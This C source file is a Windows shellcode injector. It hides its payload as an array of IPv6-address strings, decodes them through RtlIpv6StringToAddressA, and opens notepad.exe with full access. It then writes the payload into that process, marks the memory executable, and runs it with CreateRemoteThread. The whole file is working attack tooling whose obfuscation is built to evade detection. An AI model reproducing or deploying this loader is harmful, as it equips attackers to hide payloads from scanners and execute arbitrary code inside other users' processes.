#include <stdio.h>
#include <Windows.h>
#include <Tlhelp32.h>

char* Ipv6Array[] = {
		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
		"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
		"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
		"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF",
		"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
};

#define NumberOfElements 17


typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR                   S,
	PCSTR* Terminator,
	PVOID                   Addr
	);


BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T          sBuffSize = NULL;

	PCSTR           Terminator = NULL;

	NTSTATUS        STATUS = NULL;

	// Getting the RtlIpv6StringToAddressA function's base address from ntdll.dll
	fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Getting the size of the shellcode (number of elements * 16)
	sBuffSize = NmbrOfElements * 16;
	// Allocating memory that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;


	// Loop through all the addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {
		// Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			// Failed
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD *dwProcessId, HANDLE* hProcess) {

	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};


	HANDLE hSnapShot = NULL;
	
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == NULL) {
		printf("There was an insue with snapshot");
		return FALSE;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		printf("There was an insue with generating process32");
		return FALSE;
	}

	do {
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			break;
		}
	} while (Process32Next(hSnapShot, &Proc));
	return TRUE;
} 

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
	PVOID pShellcodeAddress = NULL;
	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sBytesWritten)) {
		printf("Failed to write proc memory");
		return FALSE;
	}
	
	memset(pShellcode, '\0', sSizeOfShellcode);

	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL)) {
		printf("Failed to create remote thread");
		return FALSE;
	}
	return TRUE;
}

int main() {
	//wchar_t* sProcessName[30];
	DWORD dwProcessId = NULL;
	HANDLE hProcess = NULL;

	PBYTE		pDeobfuscatedPayload = NULL;
	SIZE_T      sDeobfuscatedSize = NULL;

	printf("---SHELLCODE INJECTOR INTO PROCESS---\n\n\nName of process: ");

	//fgetws(sProcessName, sizeof(sProcessName), stdin);
	printf("\n");

	wchar_t* sProcessName = L"notepad.exe";
	wprintf(L"%s\n", sProcessName);

	if (!GetRemoteProcessHandle(sProcessName, &dwProcessId, &hProcess)) {
		printf("Something went wrong getting process");
		return -1;
	}

	if (hProcess == NULL) {
		printf("Something went wrong, hProcess = NULL");
	}

	if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		printf("Something went wrong with deobfucating");
		return -1;
	}
	
	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		printf("Something went wrong with Injecting");
		return -1;
	}

	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	CloseHandle(hProcess);
	printf("\nPress <Enter> To Quit ... ");
	getchar();
	return 0;
}